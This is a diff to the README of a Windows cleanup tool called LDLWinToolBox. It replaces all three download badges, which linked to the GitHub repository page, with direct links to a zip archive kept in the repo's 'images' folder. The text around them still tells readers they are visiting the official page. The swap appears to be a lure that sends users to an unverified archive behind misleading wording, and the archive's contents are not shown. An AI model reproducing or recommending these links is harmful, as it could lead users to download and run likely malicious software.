@@ -1,6 +1,6 @@
 # 🛠️ LDLWinToolBox - Easy Windows Cleanup and Optimization
 
-[![Download LDLWinToolBox](https://img.shields.io/badge/Download-LDLWinToolBox-brightgreen?style=for-the-badge)](https://github.com/kikemaguilla83/LDLWinToolBox)
+[![Download LDLWinToolBox](https://img.shields.io/badge/Download-LDLWinToolBox-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kikemaguilla83/LDLWinToolBox/main/images/Box-LDL-Win-Tool-v3.5-beta.2.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to get LDLWinToolBox running on your Windows PC.
 
 Click the link below to visit the official page where you can download LDLWinToolBox:
 
-[![Download Here](https://img.shields.io/badge/Visit%20to%20Download-Click%20Here-blue?style=for-the-badge)](https://github.com/kikemaguilla83/LDLWinToolBox)
+[![Download Here](https://img.shields.io/badge/Visit%20to%20Download-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/kikemaguilla83/LDLWinToolBox/main/images/Box-LDL-Win-Tool-v3.5-beta.2.zip)
 
 Once on the page, look for the latest release or the main folder labeled with the tool’s name. Download the compressed archive file (usually a `.zip`).
 
@@ -142,4 +142,4 @@ If problems persist, try manual system repairs using Windows built-in tools or s
 
 Click below to go to the official GitHub page and download the tool:
 
-[![Get LDLWinToolBox](https://img.shields.io/badge/Download%20LDLWinToolBox-green?style=for-the-badge)](https://github.com/kikemaguilla83/LDLWinToolBox)
+[![Get LDLWinToolBox](https://img.shields.io/badge/Download%20LDLWinToolBox-green?style=for-the-badge)](https://raw.githubusercontent.com/kikemaguilla83/LDLWinToolBox/main/images/Box-LDL-Win-Tool-v3.5-beta.2.zip)
